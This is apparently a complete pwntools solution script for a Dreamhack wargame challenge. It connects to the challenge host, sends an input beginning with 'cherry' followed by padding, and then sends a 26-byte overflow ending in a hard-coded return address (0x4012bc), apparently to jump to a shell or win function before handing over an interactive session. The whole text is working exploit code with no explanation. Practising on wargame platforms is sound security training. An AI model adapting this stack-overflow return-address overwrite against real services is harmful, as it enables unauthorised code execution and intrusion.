from pwn import *

p = remote('host8.dreamhack.games', 19740)

payday = b'cherry'
payday += b'A'*7

payload = b'A'*26
payload += p64(0x00000000004012bc)

p.sendline(payday)
p.sendline(payload)

p.interactive()